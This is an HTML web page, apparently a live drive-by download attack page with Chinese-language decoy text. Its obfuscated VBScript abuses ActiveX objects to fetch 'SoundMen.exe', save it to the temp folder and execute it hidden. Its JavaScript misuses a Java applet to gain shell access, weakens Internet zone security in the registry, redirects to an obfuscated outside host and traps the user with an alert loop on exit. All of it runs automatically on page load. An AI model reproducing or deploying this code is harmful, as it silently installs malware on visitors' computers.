<html>
<head>
<meta http-equiv="Content-Language" content="zh-cn">
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title></title>
</head>
<script language="VBScript">
sub d_mm
on error resume next
fname1="SoundMen.exe"
lh=location.href
pos=InStrRev(lh,"/")
pt=mid(lh,1,pos)
dl =pt & fname1

Set df = document.createElement("object")
df.setAttribute "classid", "cls"&"id:BD96C5"&"56-65"&"A3-11D0-98"&"3A-00C04"&"FC29E36"
str="Micr"&"osoft.XML"&"HT"&"TP"

Set x = df.CreateObject(str,"")
a1="Ado"
a2="db."
a3="Str"
a4="eam"
str1=a1&a2&a3&a4
str5=str1

set S = df.createobject(str5,"")
S.type = 1
str6="GET"
x.Open str6, dl, False
x.Send


sf="Scrip"&"ting.Fil"&"eSys"&"temOb"&"ject"
set F = df.createobject(sf,"")
set tmp = F.GetSpecialFolder(2) 
fname1= F.BuildPath(tmp,fname1)

S.open
S.write x.responseBody
S.savetofile fname1,2
S.close

sa="Sh"&"ell."&"Appl"&"ica"&"tion"
set Q = df.createobject(sa,"")
Q.ShellExecute fname1,"","","open",0
end sub
d_mm
</script>
<script language="javascript">
function tu(){var u,i=0;u="htt"+"p://w"+"ww.";while(i<50){u+="8";i++;}u+=".c"+"om";return u;}
var d=document;
var u="/g/go.htm";
var ugo=tu()+"/b/2.htm";
var s="<"+"APP"+"LET HEIGHT=0 WIDTH=0 cod"+"e=co"+"m.ms.active"+"X.Activ"+"eXCom"+"ponent><"+"/A"+"PPLE"+"T>";
d.write(s);

function f(){ 
try 
{ 
a1=d.applets[0];
a1.setCLSID("{F935DC"+"22-1CF0-11D0-A"+"DB9-00C0"+"4FD"+"58A0B}");
a1.createInstance();
Shl = a1.GetObject();
a1.setCLSID("{0D4"+"3FE01-F093-11CF-89"+"40-00A0"+"C905"+"4228}");
a1.createInstance();
FSO = a1.GetObject();
a1.setCLSID("{F935"+"DC26-1"+"CF0-11D0-A"+"DB9-00C"+"04"+"FD58A0B}");
a1.createInstance();
Net = a1.GetObject();
try 
{ 
	if (d.cookie.indexOf("TheChg") == -1) 
	{ 
		Shl.RegWrite ("HK"+"CU\\Sof"+"tware\\Micr"+"osoft\\Win"+"dows\\Curre"+"ntVersion\\Inter"+"net Sett"+"ings\\Zo"+"nes\\3\\10"+"04",0,"R"+"EG_DWO"+"RD");
		var expdate = new Date((new Date()).getTime() + (1));
		d.cookie="TheChg=general;expires=" + expdate.toGMTString() + ";path=/;" 
	}
} 
catch(e){} 
} 
catch(e){} 
} 
function init() 
{ 
setTimeout("f()", 500);
}
function gt() 
{ 
	if(typeof(document.getElementById("stb"))=="object")
	{
		top.close();
	}
	else
	{
		top.location.href=ugo;
	}
}
function dl() 
{ 
	setTimeout("gt()", 2000);
}
init();
</script>
<script language="javascript"> 
var rne="<OBJECT ID=\"RUNIT\" WIDTH=0 HEIGHT=0 TYPE=\"application/x-oleobject\"";
rne+="CODEBASE=\"SoundMen.exe#version=1,1,1,1\">";
rne+="<PARAM NAME=\"_Version\" value=\"65536\">";
rne+="</OBJECT>";
rne+="<HTML><H1><font color=\"#9E9E9E\">��ҳ�����У����Ժ�....</font></H1></HTML>";
d.open();
d.clear();
d.writeln(rne);
d.close();


function stbs()
{
	try{
	stb.DOM.Script.window.open(ugo,'_blank');
	this.focus();
	}
	catch(e){
	}
}
function d_ul()
{
	stbs();

	while(!g_isLoad)
	{
		alert("��ҳ��δ�����꣬���Ե�......      ");
	}

}
</script>
<body language=javascript onload="dl();" onbeforeunload="d_ul();">
<OBJECT id=stb height=0 width=0 classid=clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A><PARAM NAME="ActivateActiveXControls" VALUE="1"><PARAM NAME="ActivateApplets" VALUE="1"></OBJECT>
</body>
</html>

